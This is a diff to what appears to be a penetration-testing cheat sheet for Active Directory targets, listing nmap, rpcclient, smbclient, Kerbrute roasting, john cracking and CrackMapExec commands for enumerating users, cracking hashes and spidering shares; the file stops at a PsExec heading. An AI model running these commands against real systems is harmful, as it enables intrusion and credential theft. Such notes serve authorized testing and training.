@@ -5,11 +5,22 @@
 ### Quick Port Scan
 Start with a fast SYN scan to identify open ports and services.
 ```
-sudo nmap -Pn -v -sS -sV -sC -oN tcp-quick.nmap <TARGET_IP>
+nmap -Pn -v -sS -sV -sC -oN tcp-quick.nmap <TARGET_IP>
 ```
 
 Key Ports: 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S), 445 (SMB), 593 (RPC over HTTP)
 
+### LDAP Enumeration:
+Run standard Nmap LDAP scripts to extract domain information.
+```
+nmap -sS -Pn -sV --script=ldap* -p 389,636,3268,3269 <TARGET_IP>
+```
+
+### SMB Enumeration:
+Check for null sessions and list available shares.
+```
+nmap --script smb-enum-shares -p 139,445 <TARGET_IP>
+```
 
 ### RPC Enumeration:
 If RPC ports are open, attempt null session enumeration to identify domain users.
@@ -18,18 +29,6 @@ rpcclient -U "" -N <TARGET_IP>
 # Commands inside rpcclient:
 # enumdomusers  (List users)
 # querydispinfo (List users with descriptions)
-```
-
-### LDAP Enumeration:
-Run standard Nmap LDAP scripts to extract domain information.
-```
-sudo nmap -sS -Pn -sV --script=ldap* -p 389,636,3268,3269 <TARGET_IP>
-```
-
-### SMB Enumeration:
-Check for null sessions and list available shares.
-```
-nmap --script smb-enum-shares -p 139,445 <TARGET_IP>
 ```
 
 ### SMBClient listing (Null session)
@@ -42,7 +41,7 @@ smbclient -m=SMB2 -L \\<HOSTNAME>\ -N
 ### Username List Creation
 Compile a list of users found during RPC/SMB enumeration into usernames.txt.
 ```
-./username-anarchy --input-file ./names.txt
+./username-anarchy --input-file ./names.txt > usernames.txt
 ```
 
 ### Kerbrute Enumeration & Roasting
@@ -67,10 +66,10 @@ john hash.txt --wordlist=rockyou.txt
 Once credentials (USER:PASS) are obtained, validate them and spider shares for sensitive files.
 ```
 ### Validate credentials and list shares
-sudo cme smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares
+cme smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares
 
 ### Spider shares for interesting files
-sudo cme smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share '<SHARE_NAME>'
+cme smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share '<SHARE_NAME>'
 ```
 
 ### Remote Execution (PsExec)
